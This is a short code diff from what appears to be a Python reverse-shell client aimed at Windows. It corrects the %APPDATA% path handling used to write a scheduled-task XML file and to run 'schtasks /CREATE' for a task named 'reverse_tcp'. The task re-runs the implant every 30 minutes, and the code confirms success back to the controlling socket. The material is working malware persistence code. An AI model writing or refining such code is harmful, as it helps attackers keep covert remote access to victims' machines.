@@ -76,7 +76,7 @@ if (platform.system() == "Windows"):
     else:
 
         ### Create schtasks_template.xml
-        with open("%Appdata%\\schtasks_template.xml", "w") as xml:
+        with open(appdata_path + "\\schtasks_template.xml", "w") as xml:
             xml.write(generateScheduleTask(30))  ## interval 30 minutes
             # xml.close()
 
@@ -117,7 +117,7 @@ while True:
             xml.close()
 
             ## create task
-            os.system("schtasks /CREATE /XML %Appdata%\\schtasks_template.xml /TN reverse_tcp")
+            os.system("schtasks /CREATE /XML " + os.getenv("APPDATA") + "\\schtasks_template.xml /TN reverse_tcp")
             s.send("The scheduled task has successfully been created")
             continue
         else: # wrong os
